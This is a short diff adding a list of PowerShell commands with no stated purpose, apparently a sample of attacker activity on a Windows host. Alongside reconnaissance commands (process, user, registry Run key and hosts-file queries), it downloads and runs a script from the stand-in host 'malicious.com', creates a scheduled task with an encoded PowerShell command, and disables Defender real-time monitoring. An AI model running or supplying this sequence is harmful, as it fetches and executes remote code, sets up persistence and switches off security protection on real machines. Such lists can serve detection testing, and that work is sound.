@@ -1,0 +1,10 @@
+Get-Process
+Get-EventLog -LogName Security -Newest 100
+Invoke-WebRequest -Uri http://malicious.com/script.ps1 -OutFile C:\temp\script.ps1
+C:\temp\script.ps1
+New-ScheduledTask -Action "powershell.exe -enc SQBFAFgA" -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date))
+Get-ChildItem HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+Set-MpPreference -DisableRealtimeMonitoring $true
+whoami /all
+net user administrator
+Get-Content C:\Windows\System32\drivers\etc\hosts
